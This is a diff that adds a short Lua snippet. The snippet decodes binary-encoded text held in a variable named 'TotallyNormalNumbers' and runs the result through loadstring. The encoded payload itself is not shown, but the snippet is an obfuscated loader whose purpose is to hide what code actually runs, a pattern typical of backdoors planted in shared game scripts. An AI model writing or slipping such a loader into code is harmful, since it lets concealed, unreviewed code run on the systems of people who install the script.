@@ -1,0 +1,16 @@
+local function binus(binuspart2)
+    local result = ""
+    for word in binuspart2:gmatch("%d+") do
+        local decimal = tonumber(word, 2)
+        local char = string.char(decimal)
+        result = result .. char
+    end
+    return result
+end
+
+local translatedText = binus(TotallyNormalNumbers)
+
+local success, errorMessage = pcall(loadstring(translatedText))
+if not success then
+    warn("Error executing Lua code: " .. errorMessage)
+end
